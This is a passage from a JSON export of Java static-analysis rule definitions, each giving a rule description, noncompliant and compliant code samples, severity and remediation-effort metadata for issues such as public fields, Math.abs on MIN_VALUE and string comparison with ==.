            "htmlDesc": "<p>Public class variable fields do not respect the encapsulation principle and has three main disadvantages:</p>\n<ul>\n  <li> Additional behavior such as validation cannot be added. </li>\n  <li> The internal representation is exposed, and cannot be changed afterwards. </li>\n  <li> Member values are subject to change from anywhere in the code and may not meet the programmer's assumptions. </li>\n</ul>\n<p>By using private attributes and accessor methods (set and get), unauthorized modifications are prevented.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class MyClass {\n\n  public static final int SOME_CONSTANT = 0;     // Compliant - constants are not checked\n\n  public String firstName;                       // Noncompliant\n\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic class MyClass {\n\n  public static final int SOME_CONSTANT = 0;     // Compliant - constants are not checked\n\n  private String firstName;                      // Compliant\n\n  public String getFirstName() {\n    return firstName;\n  }\n\n  public void setFirstName(String firstName) {\n    this.firstName = firstName;\n  }\n\n}\n</pre>\n<h2>Exceptions</h2>\n<p>Because they are not modifiable, this rule ignores <code>public final</code> fields. Also, annotated fields, whatever the annotation(s) will be\nignored, as annotations are often used by injection frameworks, which in exchange require having public fields.</p>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/493.html\">MITRE, CWE-493</a> - Critical Public Variable Without Final Modifier </li>\n</ul>",
            "mdDesc": "<p>Public class variable fields do not respect the encapsulation principle and has three main disadvantages:</p>\n<ul>\n  <li> Additional behavior such as validation cannot be added. </li>\n  <li> The internal representation is exposed, and cannot be changed afterwards. </li>\n  <li> Member values are subject to change from anywhere in the code and may not meet the programmer's assumptions. </li>\n</ul>\n<p>By using private attributes and accessor methods (set and get), unauthorized modifications are prevented.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class MyClass {\n\n  public static final int SOME_CONSTANT = 0;     // Compliant - constants are not checked\n\n  public String firstName;                       // Noncompliant\n\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic class MyClass {\n\n  public static final int SOME_CONSTANT = 0;     // Compliant - constants are not checked\n\n  private String firstName;                      // Compliant\n\n  public String getFirstName() {\n    return firstName;\n  }\n\n  public void setFirstName(String firstName) {\n    this.firstName = firstName;\n  }\n\n}\n</pre>\n<h2>Exceptions</h2>\n<p>Because they are not modifiable, this rule ignores <code>public final</code> fields. Also, annotated fields, whatever the annotation(s) will be\nignored, as annotations are often used by injection frameworks, which in exchange require having public fields.</p>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/493.html\">MITRE, CWE-493</a> - Critical Public Variable Without Final Modifier </li>\n</ul>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cwe"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "10min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "10min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "10min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "10min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S2676",
            "repo": "java",
            "name": "Neither \"Math.abs\" nor negation should be used on numbers that could be \"MIN_VALUE\"",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>It is possible for a call to <code>hashCode</code> to return <code>Integer.MIN_VALUE</code>. Take the absolute value of such a hashcode and you'll\nstill have a negative number. Since your code is likely to assume that it's a positive value instead, your results will be unreliable.</p>\n<p>Similarly, <code>Integer.MIN_VALUE</code> could be returned from <code>Random.nextInt()</code> or any object's <code>compareTo</code> method, and\n<code>Long.MIN_VALUE</code> could be returned from <code>Random.nextLong()</code>. Calling <code>Math.abs</code> on values returned from these methods\nis similarly ill-advised.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void doSomething(String str) {\n  if (Math.abs(str.hashCode()) &gt; 0) { // Noncompliant\n    // ...\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic void doSomething(String str) {\n  if (str.hashCode() != 0) {\n    // ...\n  }\n}\n</pre>",
            "mdDesc": "<p>It is possible for a call to <code>hashCode</code> to return <code>Integer.MIN_VALUE</code>. Take the absolute value of such a hashcode and you'll\nstill have a negative number. Since your code is likely to assume that it's a positive value instead, your results will be unreliable.</p>\n<p>Similarly, <code>Integer.MIN_VALUE</code> could be returned from <code>Random.nextInt()</code> or any object's <code>compareTo</code> method, and\n<code>Long.MIN_VALUE</code> could be returned from <code>Random.nextLong()</code>. Calling <code>Math.abs</code> on values returned from these methods\nis similarly ill-advised.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void doSomething(String str) {\n  if (Math.abs(str.hashCode()) &gt; 0) { // Noncompliant\n    // ...\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic void doSomething(String str) {\n  if (str.hashCode() != 0) {\n    // ...\n  }\n}\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S2677",
            "repo": "java",
            "name": "\"read\" and \"readLine\" return values should be used",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>When a method is called that returns data read from some data source, that data should be stored rather than thrown away. Any other course of\naction is surely a bug.</p>\n<p>This rule raises an issue when the return value of any of the following is ignored or merely null-checked: <code>BufferedReader.readLine()</code>,\n<code>Reader.read()</code>, and these methods in any child classes.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void doSomethingWithFile(String fileName) {\n  BufferedReader buffReader = null;\n  try {\n    buffReader = new BufferedReader(new FileReader(fileName));\n    while (buffReader.readLine() != null) { // Noncompliant\n      // ...\n    }\n  } catch (IOException e) {\n    // ...\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic void doSomethingWithFile(String fileName) {\n  BufferedReader buffReader = null;\n  try {\n    buffReader = new BufferedReader(new FileReader(fileName));\n    String line = null;\n    while ((line = buffReader.readLine()) != null) {\n      // ...\n    }\n  } catch (IOException e) {\n    // ...\n  }\n}\n</pre>",
            "mdDesc": "<p>When a method is called that returns data read from some data source, that data should be stored rather than thrown away. Any other course of\naction is surely a bug.</p>\n<p>This rule raises an issue when the return value of any of the following is ignored or merely null-checked: <code>BufferedReader.readLine()</code>,\n<code>Reader.read()</code>, and these methods in any child classes.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void doSomethingWithFile(String fileName) {\n  BufferedReader buffReader = null;\n  try {\n    buffReader = new BufferedReader(new FileReader(fileName));\n    while (buffReader.readLine() != null) { // Noncompliant\n      // ...\n    }\n  } catch (IOException e) {\n    // ...\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic void doSomethingWithFile(String fileName) {\n  BufferedReader buffReader = null;\n  try {\n    buffReader = new BufferedReader(new FileReader(fileName));\n    String line = null;\n    while ((line = buffReader.readLine()) != null) {\n      // ...\n    }\n  } catch (IOException e) {\n    // ...\n  }\n}\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S4973",
            "repo": "java",
            "name": "Strings and Boxed types should be compared using \"equals()\"",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>It's almost always a mistake to compare two instances of <code>java.lang.String</code> or boxed types like <code>java.lang.Integer</code> using\nreference equality <code>==</code> or <code>!=</code>, because it is not comparing actual value but locations in memory.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nString firstName = getFirstName(); // String overrides equals\nString lastName = getLastName();\n\nif (firstName == lastName) { ... }; // Non-compliant; false even if the strings have the same value\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nString firstName = getFirstName();\nString lastName = getLastName();\n\nif (firstName != null &amp;&amp; firstName.equals(lastName)) { ... };\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/595.html\">MITRE, CWE-595</a> - Comparison of Object References Instead of Object Contents </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/597.html\">MITRE, CWE-597</a> - Use of Wrong Operator in String Comparison </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/UjdGBQ\">CERT, EXP03-J.</a> - Do not use the equality operators when comparing values of boxed\n  primitives </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/yDdGBQ\">CERT, EXP50-J.</a> - Do not confuse abstract object equality with reference equality\n  </li>\n</ul>",
            "mdDesc": "<p>It's almost always a mistake to compare two instances of <code>java.lang.String</code> or boxed types like <code>java.lang.Integer</code> using\nreference equality <code>==</code> or <code>!=</code>, because it is not comparing actual value but locations in memory.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nString firstName = getFirstName(); // String overrides equals\nString lastName = getLastName();\n\nif (firstName == lastName) { ... }; // Non-compliant; false even if the strings have the same value\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nString firstName = getFirstName();\nString lastName = getLastName();\n\nif (firstName != null &amp;&amp; firstName.equals(lastName)) { ... };\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/595.html\">MITRE, CWE-595</a> - Comparison of Object References Instead of Object Contents </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/597.html\">MITRE, CWE-597</a> - Use of Wrong Operator in String Comparison </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/UjdGBQ\">CERT, EXP03-J.</a> - Do not use the equality operators when comparing values of boxed\n  primitives </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/yDdGBQ\">CERT, EXP50-J.</a> - Do not confuse abstract object equality with reference equality\n  </li>\n</ul>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert",
                "cwe"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S1223",
            "repo": "java",
            "name": "Non-constructor methods should not have the same name as the enclosing class",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Having a class and some of its methods sharing the same name is misleading, and leaves others to wonder whether it was done that way on purpose, or\nwas the methods supposed to be a constructor.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class Foo {\n   public Foo() {...}\n   public void Foo(String label) {...}  // Noncompliant\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic class Foo {\n   public Foo() {...}\n   public void foo(String label) {...}  // Compliant\n}\n</pre>",
            "mdDesc": "<p>Having a class and some of its methods sharing the same name is misleading, and leaves others to wonder whether it was done that way on purpose, or\nwas the methods supposed to be a constructor.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class Foo {\n   public Foo() {...}\n   public void Foo(String label) {...}  // Noncompliant\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic class Foo {\n   public Foo() {...}\n   public void foo(String label) {...}  // Compliant\n}\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "pitfall"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S2674",
            "repo": "java",
            "name": "The value returned from a stream read should be checked",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>You cannot assume that any given stream reading call will fill the <code>byte[]</code> passed in to the method. Instead, you must check the value\nreturned by the read method to see how many bytes were read. Fail to do so, and you introduce bug that is both harmful and difficult to reproduce.</p>\n<p>Similarly, you cannot assume that <code>InputStream.skip</code> will actually skip the requested number of bytes, but must check the value returned\nfrom the method.</p>\n<p>This rule raises an issue when an <code>InputStream.read</code> method that accepts a <code>byte[]</code> is called, but the return value is not\nchecked, and when the return value of <code>InputStream.skip</code> is not checked. The rule also applies to <code>InputStream</code> child\nclasses.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void doSomething(String fileName) {\n  try {\n    InputStream is = new InputStream(file);\n    byte [] buffer = new byte[1000];\n    is.read(buffer);  // Noncompliant\n    // ...\n  } catch (IOException e) { ... }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic void doSomething(String fileName) {\n  try {\n    InputStream is = new InputStream(file);\n    byte [] buffer = new byte[1000];\n    int count = 0;\n    while (count = is.read(buffer) &gt; 0) {\n      // ...\n    }\n  } catch (IOException e) { ... }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/VzdGBQ\">CERT, FIO10-J.</a> - Ensure the array is filled when using read() to fill an array </li>\n</ul>",
            "mdDesc": "<p>You cannot assume that any given stream reading call will fill the <code>byte[]</code> passed in to the method. Instead, you must check the value\nreturned by the read method to see how many bytes were read. Fail to do so, and you introduce bug that is both harmful and difficult to reproduce.</p>\n<p>Similarly, you cannot assume that <code>InputStream.skip</code> will actually skip the requested number of bytes, but must check the value returned\nfrom the method.</p>\n<p>This rule raises an issue when an <code>InputStream.read</code> method that accepts a <code>byte[]</code> is called, but the return value is not\nchecked, and when the return value of <code>InputStream.skip</code> is not checked. The rule also applies to <code>InputStream</code> child\nclasses.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void doSomething(String fileName) {\n  try {\n    InputStream is = new InputStream(file);\n    byte [] buffer = new byte[1000];\n    is.read(buffer);  // Noncompliant\n    // ...\n  } catch (IOException e) { ... }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic void doSomething(String fileName) {\n  try {\n    InputStream is = new InputStream(file);\n    byte [] buffer = new byte[1000];\n    int count = 0;\n    while (count = is.read(buffer) &gt; 0) {\n      // ...\n    }\n  } catch (IOException e) { ... }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/VzdGBQ\">CERT, FIO10-J.</a> - Ensure the array is filled when using read() to fill an array </li>\n</ul>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "15min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "15min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "15min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "15min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S3400",
            "repo": "java",
            "name": "Methods should not return constants",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>There's no point in forcing the overhead of a method call for a method that always returns the same constant value. Even worse, the fact that a\nmethod call must be made will likely mislead developers who call the method thinking that something more is done. Declare a constant instead. </p>\n<p>This rule raises an issue if on methods that contain only one statement: the <code>return</code> of a constant value. </p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nint getBestNumber() {\n  return 12;  // Noncompliant\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nstatic final int BEST_NUMBER = 12;\n</pre>\n<h2>Exceptions</h2>\n<p>Methods with annotations, such as <code>@Override</code> and Spring's <code>@RequestMapping</code>, are ignored.</p>",
            "mdDesc": "<p>There's no point in forcing the overhead of a method call for a method that always returns the same constant value. Even worse, the fact that a\nmethod call must be made will likely mislead developers who call the method thinking that something more is done. Declare a constant instead. </p>\n<p>This rule raises an issue if on methods that contain only one statement: the <code>return</code> of a constant value. </p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nint getBestNumber() {\n  return 12;  // Noncompliant\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nstatic final int BEST_NUMBER = 12;\n</pre>\n<h2>Exceptions</h2>\n<p>Methods with annotations, such as <code>@Override</code> and Spring's <code>@RequestMapping</code>, are ignored.</p>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "confusing"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S2675",
            "repo": "java",
            "name": "\"readObject\" should not be \"synchronized\"",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>A <code>readObject</code> method is written when a <code>Serializable</code> object needs special handling to be rehydrated from file. It should be\nthe case that the object being created by <code>readObject</code> is only visible to the thread that invoked the method, and the\n<code>synchronized</code> keyword is not needed, and using <code>synchronized</code> anyway is just confusing. If this is not the case, the method\nshould be refactored to make it the case.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nprivate synchronized void readObject(java.io.ObjectInputStream in)\n     throws IOException, ClassNotFoundException { // Noncompliant\n  //...\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nprivate void readObject(java.io.ObjectInputStream in)\n     throws IOException, ClassNotFoundException { // Compliant\n  //...\n}\n</pre>",
            "mdDesc": "<p>A <code>readObject</code> method is written when a <code>Serializable</code> object needs special handling to be rehydrated from file. It should be\nthe case that the object being created by <code>readObject</code> is only visible to the thread that invoked the method, and the\n<code>synchronized</code> keyword is not needed, and using <code>synchronized</code> anyway is just confusing. If this is not the case, the method\nshould be refactored to make it the case.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nprivate synchronized void readObject(java.io.ObjectInputStream in)\n     throws IOException, ClassNotFoundException { // Noncompliant\n  //...\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nprivate void readObject(java.io.ObjectInputStream in)\n     throws IOException, ClassNotFoundException { // Compliant\n  //...\n}\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "confusing"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "2min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "2min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "2min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "2min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S4970",
            "repo": "java",
            "name": "Derived exceptions should not hide their parents' catch blocks",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>The <code>catch</code> block of a checked exception \"E\" may be hidden because the corresponding <code>try</code> block only throws exceptions\nderived from E.</p>\n<p>These derived exceptions are handled in dedicated <code>catch</code> blocks prior to the <code>catch</code> block of the base exception E. </p>\n<p>The <code>catch</code> block of E is unreachable and should be considered dead code. It should be removed, or the entire try-catch structure should\nbe refactored.</p>\n<p>It is also possible that a single exception type in a multi-catch block may be hidden while the catch block itself is still reachable. In that case\nit is enough to only remove the hidden exception type or to replace it with another type.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class HiddenCatchBlock {\n\n  public static class CustomException extends Exception {\n  }\n\t\n  public static class CustomDerivedException extends CustomException {\n  }\n\t\n  public static void main(String[] args) {\n    try {\n      throwCustomDerivedException();\n    } catch(CustomDerivedException e) {\n      // ...\n    } catch(CustomException e) { // Noncompliant; this code is unreachable\n      // ...\n    }\n  }\n\n  private static void throwCustomDerivedException() throws CustomDerivedException {\n    throw new CustomDerivedException();\n  }\t\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic class HiddenCatchBlock {\n\n  public static class CustomException extends Exception {\n  }\n\t\n  public static class CustomDerivedException extends CustomException {\n  }\n\t\n  public static void main(String[] args) {\n    try {\n      throwCustomDerivedException();\n    } catch(CustomDerivedException e) { // Compliant; try-catch block is \"catching\" only the Exception that can be thrown in the \"try\"\n      //...\n    }\n  }\t\n}\n</pre>",
            "mdDesc": "<p>The <code>catch</code> block of a checked exception \"E\" may be hidden because the corresponding <code>try</code> block only throws exceptions\nderived from E.</p>\n<p>These derived exceptions are handled in dedicated <code>catch</code> blocks prior to the <code>catch</code> block of the base exception E. </p>\n<p>The <code>catch</code> block of E is unreachable and should be considered dead code. It should be removed, or the entire try-catch structure should\nbe refactored.</p>\n<p>It is also possible that a single exception type in a multi-catch block may be hidden while the catch block itself is still reachable. In that case\nit is enough to only remove the hidden exception type or to replace it with another type.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class HiddenCatchBlock {\n\n  public static class CustomException extends Exception {\n  }\n\t\n  public static class CustomDerivedException extends CustomException {\n  }\n\t\n  public static void main(String[] args) {\n    try {\n      throwCustomDerivedException();\n    } catch(CustomDerivedException e) {\n      // ...\n    } catch(CustomException e) { // Noncompliant; this code is unreachable\n      // ...\n    }\n  }\n\n  private static void throwCustomDerivedException() throws CustomDerivedException {\n    throw new CustomDerivedException();\n  }\t\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic class HiddenCatchBlock {\n\n  public static class CustomException extends Exception {\n  }\n\t\n  public static class CustomDerivedException extends CustomException {\n  }\n\t\n  public static void main(String[] args) {\n    try {\n      throwCustomDerivedException();\n    } catch(CustomDerivedException e) { // Compliant; try-catch block is \"catching\" only the Exception that can be thrown in the \"try\"\n      //...\n    }\n  }\t\n}\n</pre>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1220",
            "repo": "java",
            "name": "The default unnamed package should not be used",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>According to the Java Language Specification:</p>\n<blockquote>\n  <p>Unnamed packages are provided by the Java platform principally for convenience when developing small or temporary applications or when just\n  beginning development.</p>\n</blockquote>\n<p>To enforce this best practice, classes located in default package can no longer be accessed from named ones since Java 1.4.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class MyClass { /* ... */ }\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npackage org.example;\n\npublic class MyClass{ /* ... */ }\n</pre>",
            "mdDesc": "<p>According to the Java Language Specification:</p>\n<blockquote>\n  <p>Unnamed packages are provided by the Java platform principally for convenience when developing small or temporary applications or when just\n  beginning development.</p>\n</blockquote>\n<p>To enforce this best practice, classes located in default package can no longer be accessed from named ones since Java 1.4.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class MyClass { /* ... */ }\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npackage org.example;\n\npublic class MyClass{ /* ... */ }\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "convention"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "10min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "10min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "10min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "10min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1221",
            "repo": "java",
            "name": "Methods should not be named \"tostring\", \"hashcode\" or \"equal\"",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Naming a method <code>tostring</code>, <code>hashcode</code> or <code>equal</code> is either:</p>\n<ul>\n  <li> A bug in the form of a typo. Overriding <code>toString</code>, <code>Object.hashCode()</code> (note the camelCasing) or\n  <code>Object.equals</code> (note the 's' on the end) was meant, and the application does not behave as expected. </li>\n  <li> Done on purpose. The name however will confuse every other developer, who may not notice the naming difference, or who will think it is a bug.\n  </li>\n</ul>\n<p>In both cases, the method should be renamed.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic int hashcode() { /* ... */ }  // Noncompliant\n\npublic String tostring() { /* ... */ } // Noncompliant\n\npublic boolean equal(Object obj) { /* ... */ }  // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n@Override\npublic int hashCode() { /* ... */ }\n\n@Override\npublic String toString() { /* ... */ }\n\n@Override\npublic boolean equals(Object obj) { /* ... */ }\n</pre>",
            "mdDesc": "<p>Naming a method <code>tostring</code>, <code>hashcode</code> or <code>equal</code> is either:</p>\n<ul>\n  <li> A bug in the form of a typo. Overriding <code>toString</code>, <code>Object.hashCode()</code> (note the camelCasing) or\n  <code>Object.equals</code> (note the 's' on the end) was meant, and the application does not behave as expected. </li>\n  <li> Done on purpose. The name however will confuse every other developer, who may not notice the naming difference, or who will think it is a bug.\n  </li>\n</ul>\n<p>In both cases, the method should be renamed.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic int hashcode() { /* ... */ }  // Noncompliant\n\npublic String tostring() { /* ... */ } // Noncompliant\n\npublic boolean equal(Object obj) { /* ... */ }  // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n@Override\npublic int hashCode() { /* ... */ }\n\n@Override\npublic String toString() { /* ... */ }\n\n@Override\npublic boolean equals(Object obj) { /* ... */ }\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "pitfall"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "10min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "10min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "10min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "10min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S1109",
            "repo": "java",
            "name": "A close curly brace should be located at the beginning of a line",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Shared coding conventions make it possible for a team to efficiently collaborate. This rule makes it mandatory to place a close curly brace at the\nbeginning of a line.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nif(condition) {\n  doSomething();}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nif(condition) {\n  doSomething();\n}\n</pre>\n<h2>Exceptions</h2>\n<p>When blocks are inlined (open and close curly braces on the same line), no issue is triggered. </p>\n<pre>\nif(condition) {doSomething();}\n</pre>",
